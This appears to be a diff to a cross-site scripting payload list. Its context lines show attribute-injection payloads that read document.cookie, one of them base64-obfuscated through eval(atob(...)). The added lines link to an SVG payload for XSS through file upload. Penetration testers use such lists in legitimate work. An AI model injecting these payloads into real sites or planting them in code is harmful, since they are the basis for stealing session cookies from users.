@@ -11,6 +11,9 @@ payload
 " onfocus=alert(document.cookie) autofocus=">
 " onfocus=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ==')) autofocus=">
 
+#xss via file upload testting
+https://github.com/h6nt3r/file_upload_payloads/blob/main/xss/rxss/cookie.svg
+
 
 
 
